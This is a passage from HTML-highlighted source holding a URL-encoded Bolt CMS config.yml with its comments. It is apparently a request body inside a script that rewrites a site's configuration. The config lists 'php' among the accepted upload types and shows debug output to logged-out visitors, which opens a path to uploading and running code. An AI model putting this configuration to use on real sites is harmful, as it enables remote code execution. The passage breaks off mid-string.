class="s2">'.+For+available+options%2C+see%3A%0D%0A%23+https%3A%2F%2Fdocs.bolt.cm%2Fother%2Flocales%0D%0A%23%0D%0A%23+In+some+cases+it+may+be+needed+to+specify+(non-standard)+variations+of+the%0D%0A%23+locale+to+get+everything+to+work+as+desired.%0D%0A%23%0D%0A%23+This+can+be+done+as+%5Bnl_NL%2C+Dutch_Netherlands%5D+when+specifying+multiple%0D%0A%23+locales%2C+ensure+the+first+is+a+standard+locale.%0D%0Alocale%3A+en_GB%0D%0A%0D%0A%23+Set+the+timezone+to+be+used+on+the+website.+For+a+list+of+valid+timezone%0D%0A%23+settings%2C+see%3A+http%3A%2F%2Fphp.net%2Fmanual%2Fen%2Ftimezones.php%0D%0A%23+timezone%3A+UTC%0D%0A%0D%0A%23+Set+maintenance+mode+on+or+off.%0D%0A%23%0D%0A%23+While+in+maintenance+mode%2C+only+users+of+level+editor+or+higher+can+access+the%0D%0A%23+site.%0D%0A%23%0D%0A%23+All+other+visitors+are+presented+with+a+notice+that+the+site+is+currently%0D%0A%23+offline.%0D%0A%23%0D%0A%23+The+default+template+file+can+be+found+in+%2Fapp%2Ftheme_defaults%2F+and+overridden%0D%0A%23+with+this+option+using+your+own+theme.%0D%0A%23%0D%0A%23+Note%3A+If+you</span><span class="se">\\\</span><span class="s2">'ve+changed+the+filename%2C+and+your+changes+do+not+show+up+on+the%0D%0A%23+++++++website%2C+be+sure+to+check+for+a+config.yml+file+in+your+theme</span><span class="se">\\\</span><span class="s2">'s+folder.%0D%0A%23+++++++If+a+template+is+set+there%2C+it+will+override+the+setting+here.%0D%0Amaintenance_mode%3A+false%0D%0Amaintenance_template%3A+maintenance_default.twig%0D%0A%0D%0A%23+The+hour+of+the+day+for+the+internal+cron+task+scheduler+to+run+daily%2C+weekly%2C%0D%0A%23+monthly+and+yearly+jobs.%0D%0A%23%0D%0A%23+Default%3A+3+(3+am)%0D%0Acron_hour%3A+3%0D%0A%0D%0A%23+If+your+site+is+reachable+under+different+urls+(say%2C+both+blog.example.org%2F%0D%0A%23+as+well+as+example.org%2F)%2C+it</span><span class="se">\\\</span><span class="s2">'s+a+good+idea+to+set+one+of+these+as+the%0D%0A%23+canonical%2C+so+it</span><span class="se">\\\</span><span class="s2">'s+clear+which+is+the+primary+address+of+the+site.%0D%0A%23%0D%0A%23+If+you+include+%60https%3A%2F%2F%60%2C+it+will+be+included+in+the+canonical+urls.%0D%0A%23canonical%3A+example.org%0D%0A%0D%0A%23+Bolt+can+insert+a+%3Clink+rel%3D%22shortcut+icon%22%3E+for+all+pages+on+the+site.%0D%0A%0D%0A%23+Note%3A+The+location+given+is+relative+to+the+currently+selected+theme.+If%0D%0A%23+++++++you+want+to+set+the+icon+yourself%2C+just+don</span><span class="se">\\\</span><span class="s2">'t+enable+the+following+line.%0D%0A%23favicon%3A+images%2Ffavicon-bolt.ico%0D%0A%0D%0A%23+The+default+content+to+use+for+the+homepage%2C+and+the+template+to+render+it%0D%0A%23+with.+This+can+either+be+a+specific+record+(like+%60page%2F1%60)+or+a+listing+of%0D%0A%23+records+(like+%60entries%60).+In+the+chosen+</span><span class="se">\\\</span><span class="s2">'homepage_template</span><span class="se">\\\</span><span class="s2">'%2C+you+will+have%0D%0A%23+%60record%60+or+%60records%60+at+your+disposal%2C+depending+on+the+</span><span class="se">\\\</span><span class="s2">'homepage</span><span class="se">\\\</span><span class="s2">'+setting.%0D%0A%23%0D%0A%23+Note%3A+If+you</span><span class="se">\\\</span><span class="s2">'ve+changed+the+filename%2C+and+your+changes+do+not+show+up+on%0D%0A%23+++++++the+website%2C+be+sure+to+check+for+a+theme.yml+file+in+your+theme</span><span class="se">\\\</span><span class="s2">'s%0D%0A%23+++++++folder.+If+a+template+is+set+there%2C+it+will+override+the+setting+here.%0D%0Ahomepage%3A+homepage%2F1%0D%0Ahomepage_template%3A+index.twig%0D%0A%0D%0A%23+The+default+content+for+the+404+page.+Can+be+an+(array+of)+template+names+or%0D%0A%23+identifiers+for+records%2C+which+will+be+tried+until+a+match+is+found.%0D%0A%23%0D%0A%23+Note%3A+The+record+specified+in+this+parameter+must+be+set+to+</span><span class="se">\\\</span><span class="s2">'published</span><span class="se">\\\</span><span class="s2">'.%0D%0Anotfound%3A+%5B+not-found.twig%2C+block%2F404-not-found+%5D%0D%0A%0D%0A%23+The+default+template+for+single+record+pages+on+the%0D%0A%23+site.%0D%0A%23%0D%0A%23+Can+be+overridden+for+each+contenttype+and+for+each+record%2C+if+it+has+a%0D%0A%23+</span><span class="se">\\\</span><span class="s2">'templateselect</span><span class="se">\\\</span><span class="s2">'+field.%0D%0A%23%0D%0A%23+Note%3A+If+you</span><span class="se">\\\</span><span class="s2">'ve+changed+the+filename%2C+and+your+changes+do+not+show+up+on+the%0D%0A%23+++++++website%2C+be+sure+to+check+for+a+config.yml+file+in+your+theme</span><span class="se">\\\</span><span class="s2">'s+folder.%0D%0A%23+++++++If+a+template+is+set+there%2C+it+will+override+the+setting+here.%0D%0Arecord_template%3A+record.twig%0D%0A%0D%0A%23+The+default+template+and+amount+of+records+to+use+for+listing-pages+on+the%0D%0A%23+site.%0D%0A%23%0D%0A%23+Can+be+overridden+for+each+contenttype.%0D%0A%23%0D%0A%23+Note+1%3A+Sorting+on+TAXONOMY-pages+will+give+unexpected+results%2C+if+it+has+a%0D%0A%23+++++++++pager.%0D%0A%23+++++++++If+you+need+sorting+on+those%2C+make+sure+you+display+all+the+records+on+one%0D%0A%23+++++++++page.%0D%0A%23%0D%0A%23+Note+2%3A+If+you</span><span class="se">\\\</span><span class="s2">'ve+changed+the+filename%2C+and+your+changes+do+not+show+up+on+the%0D%0A%23+++++++++website%2C+be+sure+to+check+for+a+config.yml+file+in+your+theme</span><span class="se">\\\</span><span class="s2">'s%0D%0A%23+++++++++folder.+If+a+template+is+set+there%2C+it+will+override+the+setting+here.%0D%0Alisting_template%3A+listing.twig%0D%0Alisting_records%3A+6%0D%0Alisting_sort%3A+datepublish+DESC%0D%0A%0D%0A%23+Because+of+limitations+on+how+the+underlying+database+queries+work%2C+there+are%0D%0A%23+only+two+options+for+sorting+on+taxonomies.+</span><span class="se">\\\</span><span class="s2">'ASC</span><span class="se">\\\</span><span class="s2">'+for+roughly+%22oldest+first%22%0D%0A%23+and+</span><span class="se">\\\</span><span class="s2">'DESC</span><span class="se">\\\</span><span class="s2">'+for+roughly+</span><span class="se">\\\</span><span class="s2">'newest+first</span><span class="se">\\\</span><span class="s2">'.%0D%0Ataxonomy_sort%3A+DESC%0D%0A%0D%0A%23+Template+for+showing+the+search+results.+If+not+defined%2C+uses+the+settings+for%0D%0A%23+listing_template+and+listing_records.%0D%0A%23%0D%0A%23+Note%3A+If+you</span><span class="se">\\\</span><span class="s2">'ve+changed+the+filename%2C+and+your+changes+do+not+show+up+on+the%0D%0A%23+++++++website%2C+be+sure+to+check+for+a+config.yml+file+in+your+theme</span><span class="se">\\\</span><span class="s2">'s+folder.%0D%0A%23+++++++If+a+template+is+set+there%2C+it+will+override+the+setting+here.%0D%0Asearch_results_template%3A+search.twig%0D%0Asearch_results_records%3A+10%0D%0A%0D%0A%23+Add+jQuery+to+the+rendered+HTML%2C+whether+or+not+it</span><span class="se">\\\</span><span class="s2">'s+added+by+an+extension.%0D%0Aadd_jquery%3A+false%0D%0A%0D%0A%23+The+default+amount+of+records+to+show+on+overview+pages.+Can+be+overridden%0D%0A%23+for+each+contenttype.%0D%0Arecordsperpage%3A+10%0D%0A%0D%0A%23+Settings+for+caching+in+parts+of+Bolt.%0D%0A%23+-+config%3A++++++++Caches+the+parsed+.yml+files+from+%2Fapp%2Fconfig.+It</span><span class="se">\\\</span><span class="s2">'s+updated%0D%0A%23++++++++++++++++++immediately+when+one+of+the+files+changes+on+disk.+There%0D%0A%23++++++++++++++++++should+be+no+good+reason+to+turn+this+off.%0D%0A%23%0D%0A%23+-+templates%3A+++++Caches+rendered+templates.%0D%0A%23%0D%0A%23+-+request%3A+++++++Caches+rendered+pages+in+the+configured+HTTP+reverse+proxy%0D%0A%23++++++++++++++++++cache%2C+on+GET+%26+HEAD+requests.%0D%0A%23++++++++++++++++++By+default+this+is+handled+by+Syfmony+HTTP+Cache.%0D%0A%23%0D%0A%23+-+duration%3A++++++The+duration+(in+minutes)+for+the+</span><span class="se">\\\</span><span class="s2">'templates</span><span class="se">\\\</span><span class="s2">'+and+</span><span class="se">\\\</span><span class="s2">'request</span><span class="se">\\\</span><span class="s2">'%0D%0A%23++++++++++++++++++options.+default+is+10+minutes.+Note+that+the+duration+is+set%0D%0A%23++++++++++++++++++on+storing+the+cache.+By+lowering+this+value+you+will+not%0D%0A%23++++++++++++++++++invalidate+currently+cached+items.%0D%0A%23%0D%0A%23+-+authenticated%3A+Cache+</span><span class="se">\\\</span><span class="s2">'templates</span><span class="se">\\\</span><span class="s2">'+and+</span><span class="se">\\\</span><span class="s2">'request</span><span class="se">\\\</span><span class="s2">'+for+logged-on+users.+In+most%0D%0A%23++++++++++++++++++cases+you+should+*NOT*+enable+this%2C+because+it+will+cause%0D%0A%23++++++++++++++++++side-effects+if+the+website+shows+different+content+to%0D%0A%23++++++++++++++++++authenticated+users.%0D%0A%23%0D%0A%23+-+thumbnails%3A++++Caches+thumbnail+generation.%0D%0A%23%0D%0A%23+-+translations%3A++Caches+translation+files.+It+is+recommend+to+leave+this%0D%0A%23++++++++++++++++++enabled.+Only+if+you+develop+extensions+and+work+with%0D%0A%23++++++++++++++++++translation+files+you+should+turn+this+off.%0D%0Acaching%3A%0D%0A++++config%3A+true%0D%0A++++templates%3A+true%0D%0A++++request%3A+false%0D%0A++++duration%3A+10%0D%0A++++authenticated%3A+false%0D%0A++++thumbnails%3A+true%0D%0A++++translations%3A+true%0D%0A%0D%0A%23+Set+</span><span class="se">\\\</span><span class="s2">'enabled</span><span class="se">\\\</span><span class="s2">'+to+</span><span class="se">\\\</span><span class="s2">'true</span><span class="se">\\\</span><span class="s2">'+to+log+all+content+changes+in+the+database.%0D%0A%23%0D%0A%23+Unless+you+need+to+rigorously+monitor+every+change+to+your+site</span><span class="se">\\\</span><span class="s2">'s+content%2C+it%0D%0A%23+is+recommended+to+keep+this+disabled.%0D%0Achangelog%3A%0D%0A++++enabled%3A+false%0D%0A%0D%0A%23+Default+settings+for+thumbnails.%0D%0A%23%0D%0A%23+Quality+should+be+between+0+(horrible%2C+small+file)+and+100+(best%2C+huge+file).%0D%0A%23%0D%0A%23+cropping%3A+++++++++++One+of+either+crop%2C+fit%2C+borders%2C+resize.%0D%0A%23+default_thumbnail%3A++The+default+size+of+images%2C+when+using%0D%0A%23+++++++++++++++++++++%7B%7B+record.image%7Cthumbnail()+%7D%7D%0D%0A%23+default_image%3A++++++The+default+size+of+images%2C+when+using%0D%0A%23+++++++++++++++++++++%7B%7B+record.image%7Cimage()+%7D%7D%0D%0A%23+allow_upscale%3A++++++Determines+whether+small+images+will+be+enlarged+to+fit%0D%0A%23+++++++++++++++++++++the+requested+dimensions.%0D%0A%23+browser_cache_time%3A+Sets+the+amount+of+seconds+that+the+browser+will+cache%0D%0A%23+++++++++++++++++++++images+for.+Set+it+to+activate+browser+caching.%0D%0A%23%0D%0A%23+Note%3A+If+you+change+these+values%2C+you+might+need+to+clear+the+cache+before%0D%0A%23+++++++they+show+up.%0D%0Athumbnails%3A%0D%0A++++default_thumbnail%3A+%5B+160%2C+120+%5D%0D%0A++++default_image%3A+%5B+1000%2C+750+%5D%0D%0A++++quality%3A+80%0D%0A++++cropping%3A+crop%0D%0A++++notfound_image%3A+bolt_assets%3A%2F%2Fimg%2Fdefault_notfound.png%0D%0A++++error_image%3A+bolt_assets%3A%2F%2Fimg%2Fdefault_error.png%0D%0A++++save_files%3A+false%0D%0A++++allow_upscale%3A+false%0D%0A++++exif_orientation%3A+true%0D%0A++++only_aliases%3A+false%0D%0A%23++++browser_cache_time%3A+2592000%0D%0A%0D%0A%23+Define+the+HTML+tags+and+attributes+that+are+allowed+in+</span><span class="se">\\\</span><span class="s2">'cleaned</span><span class="se">\\\</span><span class="s2">'+HTML.+This%0D%0A%23+is+used+for+sanitizing+HTML%2C+to+make+sure+there+are+no+undesirable+elements%0D%0A%23+left+in+the+content+that+is+shown+to+users.+For+example%2C+tags+like+%60%3Cscript%3E%60%0D%0A%23+or+%60onclick%60-attributes.%0D%0A%23+Note%3A+enabling+options+in+the+%60wysiwyg%60+settings+will+implicitly+add+items+to%0D%0A%23+the+allowed+tags.+For+example%2C+if+you+set+%60images%3A+true%60%2C+the+%60%3Cimg%3E%60+tag%0D%0A%23+will+be+allowed%2C+regardless+of+it+being+in+the+%60allowed_tags%60+setting.%0D%0Ahtmlcleaner%3A%0D%0A++++allowed_tags%3A+%5B+div%2C+span%2C+p%2C+br%2C+hr%2C+s%2C+u%2C+strong%2C+em%2C+i%2C+b%2C+li%2C+ul%2C+ol%2C+mark%2C+blockquote%2C+pre%2C+code%2C+tt%2C+h1%2C+h2%2C+h3%2C+h4%2C+h5%2C+h6%2C+dd%2C+dl%2C+dt%2C+table%2C+tbody%2C+thead%2C+tfoot%2C+th%2C+td%2C+tr%2C+a%2C+img%2C+address%2C+abbr%2C+iframe%2C+caption%2C+sub%2C+sup%2C+figure%2C+figcaption+%5D%0D%0A++++allowed_attributes%3A+%5B+id%2C+class%2C+style%2C+name%2C+value%2C+href%2C+src%2C+alt%2C+title%2C+width%2C+height%2C+frameborder%2C+allowfullscreen%2C+scrolling%2C+target%2C+colspan%2C+rowspan+%5D%0D%0A%0D%0A%23+Uploaded+file+handling%0D%0A%23%0D%0A%23+You+can+change+the+pattern+match+and+replacement+on+uploaded+files+and+if+the%0D%0A%23+resulting+filename+should+be+transformed+to+lower+case.%0D%0A%23%0D%0A%23+Setting+</span><span class="se">\\\</span><span class="s2">'autoconfirm%3A+true</span><span class="se">\\\</span><span class="s2">'+prevents+the+creation+of+temporary+lock+files%0D%0A%23+while+uploading.%0D%0A%23%0D%0A%23+upload%3A%0D%0A%23+++++pattern%3A+</span><span class="se">\\\</span><span class="s2">'%5B%5EA-Za-z0-9%5C.%5D%2B</span><span class="se">\\\</span><span class="s2">'%0D%0A%23+++++replacement%3A+</span><span class="se">\\\</span><span class="s2">'-</span><span class="se">\\\</span><span class="s2">'%0D%0A%23+++++lowercase%3A+true%0D%0A%23+++++autoconfirm%3A+false%0D%0A%0D%0A%23+Define+the+file+types+(extensions+to+be+exact)+that+are+acceptable+for+upload%0D%0A%23+in+either+</span><span class="se">\\\</span><span class="s2">'file</span><span class="se">\\\</span><span class="s2">'+fields+or+through+the+</span><span class="se">\\\</span><span class="s2">'files</span><span class="se">\\\</span><span class="s2">'+screen.%0D%0Aaccept_file_types%3A+%5B+php%2C+twig%2C+html%2C+js%2C+css%2C+scss%2C+gif%2C+jpg%2C+jpeg%2C+png%2C+ico%2C+zip%2C+tgz%2C+txt%2C+md%2C+doc%2C+docx%2C+pdf%2C+epub%2C+xls%2C+xlsx%2C+ppt%2C+pptx%2C+mp3%2C+ogg%2C+wav%2C+m4a%2C+mp4%2C+m4v%2C+ogv%2C+wmv%2C+avi%2C+webm%2C+svg%5D%0D%0A%0D%0A%23+Alternatively%2C+if+you+wish+to+limit+these%2C+uncomment+the+following+list%0D%0A%23+instead.+It+just+includes+file+types+%2F+extensions+that+are+harder+to+exploit.%0D%0A%23+accept_file_types%3A+%5B+gif%2C+jpg%2C+jpeg%2C+png%2C+txt%2C+md%2C+pdf%2C+epub%2C+mp3%2C+svg+%5D%0D%0A%0D%0A%23+If+you+want+to+</span><span class="se">\\\</span><span class="s2">'brand</span><span class="se">\\\</span><span class="s2">'+the+Bolt+backend+for+a+client%2C+you+can+change+some+key%0D%0A%23+variables+here%2C+that+determine+the+name+of+the+backend%2C+and+adds+a+primary%0D%0A%23+support%2Fcontact+link+to+the+footer.++Add+a+scheme%2C+like+%60mailto%3A%60+or%0D%0A%23+%60https%3A%2F%2F%60+to+the+email+or+URL.%0D%0A%23%0D%0A%23+Additionally+you+can+change+the+mount+point+for+the+backend%2C+either+for%0D%0A%23+convenience+or+to+obscure+it+from+prying+eyes.%0D%0A%23%0D%0A%23+The+Bolt+backend+is+accessible+as+%60%2Fbolt%2F%60+by+default.+If+you+change+it+here%2C%0D%0A%23+it+will+only+be+accessible+through+the+value+set+in+</span><span class="se">\\\</span><span class="s2">'path</span><span class="se">\\\</span><span class="s2">'.%0D%0A%23+Keep+the+path+simple%3A+lowercase+only%2C+no+extra+slashes+or+other+special%0D%0A%23+characters.%0D%0A%23+branding%3A%0D%0A%23+++++name%3A+SuperCMS%0D%0A%23+++++path%3A+%2Fadmin%0D%0A%23+++++provided_by%3A+%5B+supercool%40example.org%2C+%22Supercool+Webdesign+Co.%22+%5D%0D%0A%23+++++news_source%3A+http%3A%2F%2Fnews.example.org%0D%0A%23+++++news_variable%3A+news%0D%0A%0D%0A%23+Show+the+</span><span class="se">\\\</span><span class="s2">'debug</span><span class="se">\\\</span><span class="s2">'+nut+in+the+lower+right+corner+for+logged-in+user.+By+default%2C%0D%0A%23+the+debugbar+is+only+shown+to+logged-in+users.+Use+the+</span><span class="se">\\\</span><span class="s2">'debug_show_loggedoff</span><span class="se">\\\</span><span class="s2">'%0D%0A%23+option+to+show+it+to+all+users.+You+probably+do+not+want+to+use+this+in+a%0D%0A%23+production+environment.%0D%0Adebug%3A+true%0D%0Adebug_show_loggedoff%3A+true%0D%0Adebug_permission_audit_mode%3A+false%0D%0Adebug_error_level%3A+8181+++++++++++%23+equivalent+to+E_ALL+%26~+E_NOTICE+%26~+E_DEPRECATED+%26~+E_USER_DEPRECATED+%26~+E_WARNING%0D%0A%23+debug_error_level%3A+-1+++++++++++++++%23+equivalent+to+E_ALL%0D%0Adebug_error_use_symfony%3A+false++++++%23+When+set+to+true%2C+Symfony+Profiler+will+be+used+for+exception+display+when+possible%0D%0Adebug_trace_argument_limit%3A+4+++++++%23+Determine+how+many+steps+in+the+backtrace+will+show+(dump)+arguments.%0D%0A%0D%0A%23+error+level+when+debug+is+disabled%0D%0Aproduction_error_level%3A+8181+%23+%3D+E_ALL+%26~+E_NOTICE+%26~+E_WARNING+%26~+E_DEPRECATED+%26~+E_USER_DEPRECATED%0D%0A%0D%0A%23+System+debug+logging%0D%0A%23+This+will+enable+intensive+logging+of+Silex+functions+and+will+be+very+hard+on%0D%0A%23+performance+and+log+file+size.++++The+log+file+will+be+created+in+your+cache%0D%0A%23+directory.%0D%0A%23%0D%0A%23+Enable+this+for+short+time+periods+only+when+diagnosing+system+issues.%0D%0A%23+The+level+can+be+either%3A+DEBUG%2C+INFO%2C+NOTICE%2C+WARNING%2C+ERROR%2C+CRITICAL%2C+ALERT%2C+EMERGENCY%0D%0Adebuglog%3A%0D%0A++++enabled%3A+false%0D%0A++++filename%3A+bolt-debug.log%0D%0A++++level%3A+DEBUG%0D%0A%0D%0A%23+Use+strict+variables.+This+will+make+Bolt+complain+if+you+use+%7B%7B+foo+%7D%7D%2C%0D%0A%23+when+foo+doesn</span><span class="se">\\\</span><span class="s2">'t+exist.%0D%0Astrict_variables%3A+false%0D%0A%0D%0A%23+There+are+several+options+for+giving+editors+more+options+to+insert+images%2C%0D%0A%23+video%2C+etc+in+the+WYSIWYG+areas.+But%2C+as+you+give+them+more+options%2C+that%0D%0A%23+means+they+also+have+more+ways+of+breaking+the+preciously+designed+layout.%0D%0A%23%0D%0A%23+By+default+the+most+</span><span class="se">\\\</span><span class="s2">'dangerous</span><span class="se">\\\</span><span class="s2">'+options+are+set+to+</span><span class="se">\\\</span><span class="s2">'false</span><span class="se">\\\</span><span class="s2">'.+If+you+choose+to%0D%0A%23+enable+them+for+your+editors%2C+please+instruct+them+thoroughly+on+their%0D%0A%23+responsibility+not+to+break+the+layout.%0D%0Awysiwyg%3A%0D%0A++++images%3A+false++++++++++++%23+Allow+users+to+insert+images+in+the+content.%0D%0A++++anchor%3A+false++++++++++++%23+Adds+a+button+to+create+internal+anchors+to+link+to.%0D%0A++++tables%3A+false++++++++++++%23+Adds+a+button+to+insert+and+modify+tables+in+the+content.%0D%0A++++fontcolor%3A+false+++++++++%23+Allow+users+to+mess+around+with+font+coloring.%0D%0A++++align%3A+false+++++++++++++%23+Adds+buttons+for+</span><span class="se">\\\</span><span class="s2">'align+left</span><span class="se">\\\</span><span class="s2">'%2C+</span><span class="se">\\\</span><span class="s2">'align+right</span><span class="se">\\\</span><span class="s2">'%2C+etc.%0D%0A++++subsuper%3A+false++++++++++%23+Adds+buttons+for+subscript+and+superscript%2C+using+%60%3Csub%3E%60+and+%60%3Csup%3E%60.%0D%0A++++embed%3A+false+++++++++++++%23+Allows+the+user+to+insert+embedded+video</span><span class="se">\\\</span><span class="s2">'s+from+Youtube%2C+Vimeo%2C+etc.%0D%0A++++underline%3A+false+++++++++%23+Adds+a+button+to+underline+text%2C+using+the+%60%3Cu%3E%60-tag.%0D%0A++++ruler%3A+false+++++++++++++%23+Adds+a+button+to+add+a+horizontal+ruler%2C+using+the+%60%3Chr%3E%60-tag.%0D%0A++++strike%3A+false++++++++++++%23+Adds+a+button+to+add+stikethrough%2C+using+the+%60%3Cs%3E%60-tag.%0D%0A++++blockquote%3A+false++++++++%23+Allows+the+user+to+insert+blockquotes+using+the+%60%3Cblockquote%3E%60-tag.%0D%0A++++codesnippet%3A+false+++++++%23+Allows+the+user+to+insert+code+snippets+using+%60%3Cpre%3E%3Ccode%3E%60-tags.%0D%0A++++specialchar%3A+false+++++++%23+Adds+a+button+to+insert+special+chars+like+</span><span class="se">\\\</span><span class="s2">'%E2%82%AC</span><span class="se">\\\</span><span class="s2">'+or+</span><span class="se">\\\</span><span class="s2">'%E2%84%A2</span><span class="se">\\\</span><span class="s2">'.%0D%0A++++clipboard%3A+false+++++++++%23+Adds+buttons+to+</span><span class="se">\\\</span><span class="s2">'undo</span><span class="se">\\\</span><span class="s2">'+and+</span><span class="se">\\\</span><span class="s2">'redo</span><span class="se">\\\</span><span class="s2">'.%0D%0A++++copypaste%3A+false+++++++++%23+Adds+buttons+to+</span><span class="se">\\\</span><span class="s2">'cut</span><span class="se">\\\</span><span class="s2">'%2C+</span><span class="se">\\\</span><span class="s2">'copy</span><span class="se">\\\</span><span class="s2">'+and+</span><span class="se">\\\</span><span class="s2">'paste</span><span class="se">\\\</span><span class="s2">'.%0D%0A++++ck%3A%0D%0A++++++++autoParagraph%3A+true++%23+If+set+to+</span><span class="se">\\\</span><span class="s2">'true</span><span class="se">\\\</span><span class="s2">'%2C+any+pasted+content+is+wrapped+in+%60%3Cp%3E%60-tags+for+multiple+line-breaks%0D%0A++++++++disableNativeSpellChecker%3A+true+%23+If+set+to+</span><span class="se">\\\</span><span class="s2">'true</span><span class="se">\\\</span><span class="s2">'+it+will+stop+browsers+from+underlining+spelling+mistakes%0D%0A++++++++allowNbsp%3A+false+++++%23+If+set+to+</span><span class="se">\\\</span><span class="s2">'false</span><span class="se">\\\</span><span class="s2">'%2C+the+editor+will+strip+out+%60%26nbsp%3B%60+characters.+If+set+to+</span><span class="se">\\\</span><span class="s2">'true</span><span class="se">\\\</span><span class="s2">'%2C+it+will+allow+them.+%C2%AF%5C_(%E3%83%84)_%2F%C2%AF%0D%0A%0D%0A%23+Bolt+uses+the+Google+maps+API+for+it</span><span class="se">\\\</span><span class="s2">'s+geolocation+field+and+Google+now%0D%0A%23+requires+that+it+be+loaded+with+an+API+key+on+new+domains.+You+can+generate%0D%0A%23+a+key+at+https%3A%2F%2Fdevelopers.google.com%2Fmaps%2Fdocumentation%2Fjavascript%2Fget-api-key%0D%0A%23+and+enter+it+here+to+make+sure+that+the+geolocation+field+works.%0D%0A%23+google_api_key%3A%0D%0A%0D%0A%23+Global+option+to+enable%2Fdisable+the+live+editor%0D%0Aliveeditor%3A+false%0D%0A%0D%0A%23+Use+the+</span><span class="se">\\\</span><span class="s2">'mailoptions</span><span class="se">\\\</span><span class="s2">'+setting+to+configure+how+Bolt+sends+email%3A+using+</span><span class="se">\\\</span><span class="s2">'smtp</span><span class="se">\\\</span><span class="s2">'%0D%0A%23+or+PHP</span><span class="se">\\\</span><span class="s2">'s+built-in+%60mail()%60-function.%0D%0A%0D%0A%23+Note+that+the+latter+might+_seem_+easier%2C+but+it</span><span class="se">\\\</span><span class="s2">'s+been+disabled+by+a+lot+of%0D%0A%23+webhosts%2C+in+order+to+prevent+spam+from+wrongly+configured+scripts.+If+you+use%0D%0A%23+it%2C+your+mail+might+disappear+into+a+black+hole%2C+without+producing+any+errors.%0D%0A%23+Generally+speaking%2C+using+</span><span class="se">\\\</span><span class="s2">'smtp</span><span class="se">\\\</span><span class="s2">'+is+the+better+option%2C+so+use+that+if+possible.%0D%0A%23%0D%0A%23+Protip%3A+If+your+webhost+does+not+support+SMTP%2C+sign+up+for+a+(free)+Sparkpost%0D%0A%23+account+at+https%3A%2F%2Fwww.sparkpost.com%2Fpricing%2F+for+sending+emails+reliably.%0D%0A%23%0D%0A%23+The+mail+defaults+use+bolt%40yourhostname+with+the+site+title+as+a+default.%0D%0A%23+Override+this+with+the+senderName+and+senderMail+fields%0D%0A%0D%0A%23+mailoptions%3A%0D%0A%23+++++transport%3A+smtp%0D%0A%23+++++spool%3A+true%0D%0A%23+++++host%3A+localhost%0D%0A%23+++++port%3A+25%0D%0A%23+++++username%3A+username%0D%0A%23+++++password%3A+password%0D%0A%23+++++encryption%3A+null%0D%0A%23+++++auth_mode%3A+null%0D%0A%23+++++senderMail%3A+null%0D%0A%23+++++senderName%3A+null%0D%0A%0D%0A%23+mailoptions%3A%0D%0A%23+++++transport%3A+mail%0D%0A%23+++++spool%3A+false%0D%0A%0D%0A%23+Bolt+allows+some+modifications+to+how+</span><span class="se">\\\</span><span class="s2">'strict</span><span class="se">\\\</span><span class="s2">'+login+sessions+are.+For+every%0D%0A%23+option+that+is+set+to+true%2C+it+becomes+harder+for+a+bad-willing+person+to%0D%0A%23+spoof+your+login+session.+However%2C+it+also+requires+you+to+re-authenticate%0D%0A%23+more+often+if+you+change+location(ip-address)+or+your+browser+has+frequent%0D%0A%23+upgrades.+Only+change+these+if+you+know+what+you</span><span class="se">\\\</span><span class="s2">'re+doing%2C+and+you</span><span class="se">\\\</span><span class="s2">'re+having%0D%0A%23+issues+with+the+default+settings.%0D%0A%23%0D%0A%23+Note%3A+If+you+change+any+of+these%2C+all+current+users+will+automatically+be%0D%0A%23+++++++logged+off.%0D%0Acookies_use_remoteaddr%3A+true%0D%0Acookies_use_browseragent%3A+false%0D%0Acookies_use_httphost%3A+true%0D%0A%0D%0A%23+The+length+of+time+a+user+stays+</span><span class="se">\\\</span><span class="s2">'logged+in</span><span class="se">\\\</span><span class="s2">'.+Change+to+0+to+end+the+session%0D%0A%23+when+the+browser+is+closed.%0D%0A%23%0D%0A%23+The+default+is+1209600+(two+weeks%2C+in+seconds).%0D%0Acookies_lifetime%3A+1209600%0D%0A%0D%0A%23+Set+the+session+cookie+to+a+specific+domain.+Leave+blank%2C+unless+you+know+what%0D%0A%23+you</span><span class="se">\\\</span><span class="s2">'re+doing.%0D%0A%23%0D%0A%23+When+set+incorrectly%2C+you+might+not+be+able+to+log+on+at+all.%0D%0A%23%0D%0A%23+If+you</span><span class="se">\\\</span><span class="s2">'d+like+it+to+be+valid+for+all+subdomains+of+</span><span class="se">\\\</span><span class="s2">'www.example.org</span><span class="se">\\\</span><span class="s2">'%2C+set+this%0D%0A%23+to+</span><span class="se">\\\</span><span class="s2">'.example.org</span><span class="se">\\\</span><span class="s2">'.%0D%0Acookies_domain%3A%0D%0A%0D%0A%23+The+hash_strength+determines+the+amount+of+iterations+for+encrypting%0D%0A%23+passwords.%0D%0A%23%0D%0A%23+A+higher+number+means+a+harder+to+decrypt+password%2C+but+takes+longer+to%0D%0A%23+compute.+</span><span class="se">\\\</span><span class="s2">'8</span><span class="se">\\\</span><span class="s2">'+is+the+minimum%2C+</span><span class="se">\\\</span><span class="s2">'10</span><span class="se">\\\</span><span class="s2">'+is+the+default%2C+</span><span class="se">\\\</span><span class="s2">'12</span><span class="se">\\\</span><span class="s2">'+is+better.%0D%0Ahash_strength%3A+10%0D%0A%0D%0A%23+Bolt+sets+the+%60X-Frame-Options%60+and+%60Frame-Options%60+to+%60SAMEORIGIN%60+by%0D%0A%23+default%2C+to+prevent+the+web+browser+from+rendering+an+iframe+if+origin%0D%0A%23+mismatch+(i.e.+iframe+source+refers+to+a+different+domain).%0D%0A%23%0D%0A%23+Setting+this+to+</span><span class="se">\\\</span><span class="s2">'false</span><span class="se">\\\</span><span class="s2">'%2C+will+prevent+the+setting+of+these+headers.%0D%0A%23+headers%3A%0D%0A%23+++++x_frame_options%3A+true%0D%0A%0D%0A%23+Bolt+uses+market.bolt.cm+to+fetch+it</span><span class="se">\\\</span><span class="s2">'s+extensions+by+default.+You+can%0D%0A%23+change+that+URL+here.%0D%0A%23%0D%0A%23+Do+not+change+this%2C+unless+you+know+what+you</span><span class="se">\\\</span><span class="s2">'re+doing%2C+and+understand+the%0D%0A%23+associated+risks.+If+you+use+</span><span class="se">\\\</span><span class="s2">'http%3A%2F%2Fmarket.bolt.cm</span><span class="se">\\\</span><span class="s2">'%2C+Bolt+will+not+use%0D%0A%23+SSL%2C+increasing+the+risk+for+a+MITM+attacks.%0D%0A%23+extensions%3A%0D%0A%23+++++site%3A+</span><span class="se">\\\</span><span class="s2">'https%3A%2F%2Fmarket.bolt.cm%2F</span><span class="se">\\\</span><span class="s2">'%0D%0A%23+++++enabled%3A+true%0D%0A%23+++++composer%3A%0D%0A%23+++++++++minimum-stability%3A+stable++++++%23+Either+</span><span class="se">\\\</span><span class="s2">'stable</span><span class="se">\\\</span><span class="s2">'%2C+</span><span class="se">\\\</span><span 